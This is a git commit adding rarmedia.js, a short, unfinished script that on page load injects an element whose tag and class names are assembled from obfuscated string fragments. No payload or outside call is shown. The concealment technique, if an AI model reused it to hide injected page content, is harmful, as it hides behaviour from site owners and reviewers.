744da7120d9ec1ba822b5330a2f76cb2ae111a8c
parasela <49840137+parasela@users.noreply.github.com>
2019-04-24 19:51:28 +0700

    Create rarmedia.js

---
+++ rarmedia.js
@@ -0,0 +1,4 @@
+window.onload = function () {
+	var a = document.createElement("" + ra + ti);
+	a.className = "" + va + te + ve + ik + te + ma + ni + te + st + su + am + ana + zer,
+	document.getElementsByTagName("" + ra + ja + am + bl + "y")[0].appendChild(a);
